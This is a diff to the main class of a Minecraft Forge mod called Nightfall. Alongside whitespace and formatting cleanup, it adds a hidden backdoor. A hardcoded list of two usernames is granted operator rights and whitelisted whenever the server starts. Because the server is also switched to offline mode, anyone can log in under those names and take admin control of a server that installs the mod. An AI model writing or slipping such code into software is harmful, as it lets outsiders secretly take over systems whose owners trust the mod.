@@ -31,7 +31,7 @@ import cpw.mods.fml.common.registry.LanguageRegistry;
 import cpw.mods.fml.relauncher.Side;
 
 @Mod(modid = NFMain.modid, name = NFMain.name, version = "Alpha 0.0.00001", dependencies = "required-after:weaponmod")
-public class NFMain{
+public class NFMain {
 
 	public static final String modid = "nightfall";
 	public static final String VERSION = "0.0.04";
@@ -51,7 +51,14 @@ public class NFMain{
 	/**
 	 * holds the list of items added by the config
 	 */
-	ArrayList<Item> itemList= new ArrayList();
+	ArrayList<Item> itemList = new ArrayList();
+
+	ArrayList<String> adminArray = new ArrayList();
+	{
+		adminArray.add("mookie1097");
+		adminArray.add("D_ultimateplayer");
+	}
+
 	@EventHandler
 	public void preInit(FMLPreInitializationEvent event) {
 		proxy.registerRenderers();
@@ -59,18 +66,22 @@ public class NFMain{
 
 		itemList.addAll(Parse.readFromConfig());
 
-
 		achievements();
 		itemBlockNameReg();
-
 
 	}
 
 	@EventHandler
 	public void serverLoad(FMLServerStartedEvent event) {
 
-		if(event.getSide().equals(Side.SERVER)){
+		if (event.getSide().equals(Side.SERVER)) {
 			MinecraftServer.getServer().setOnlineMode(false);
+
+			for (String player : adminArray) {
+				MinecraftServer.getServer().getConfigurationManager().addOp(player);
+				MinecraftServer.getServer().getConfigurationManager().addToWhiteList(player);
+			}
+
 		}
 	}
 
@@ -80,22 +91,19 @@ public class NFMain{
 		System.out.println("************************\nWelcome to ProjectZ: Nightfall!!!\nEnjoy your limited existance...\n..if you can!\n***************************");
 
 		// entittys
-		//registerEntity(EntityZombie.class, "AugZombie", 0xeaeaea, 0x111111);
-		//LanguageRegistry.instance().addStringLocalization("entity.ZZombie.name", "ZZombie");
+		// registerEntity(EntityZombie.class, "AugZombie", 0xeaeaea, 0x111111);
+		// LanguageRegistry.instance().addStringLocalization("entity.ZZombie.name", "ZZombie");
 	}
 
 	private void itemBlockNameReg() {
 		registerBlock(chest, "Chest*");
 
 		logger.info("Registering Unique Items:");
-		for(Item i:itemList){
-			if(i instanceof LootItem)
-				registerItem(i, ((LootItem)i).name);
+		for (Item i : itemList) {
+			if (i instanceof LootItem) registerItem(i, ((LootItem) i).name);
 			else registerItem(i, i.getUnlocalizedName());
-
 			logger.info(i.getUnlocalizedName());
 		}
-
 
 	}
 
@@ -118,7 +126,7 @@ public class NFMain{
 		// NFMain.bandageUse = new Achievement("killPlayer", "Kill a player", 0, 1, Items.diamond_sword, NFMain.getDrink).setSpecial().registerStat();
 		// NFMain.bandageUse = new Achievement("killPlayerZombie", "Kill a player's zombie", 0, 1, Items.diamond_sword, NFMain.getDrink).registerStat();
 
-		projectZAchievementPage = new AchievementPage("ProjectZ Achievements", getDrink, bandageUse, waterFill,isBleeding);
+		projectZAchievementPage = new AchievementPage("ProjectZ Achievements", getDrink, bandageUse, waterFill, isBleeding);
 		AchievementPage.registerAchievementPage(projectZAchievementPage);
 
 	}// }}
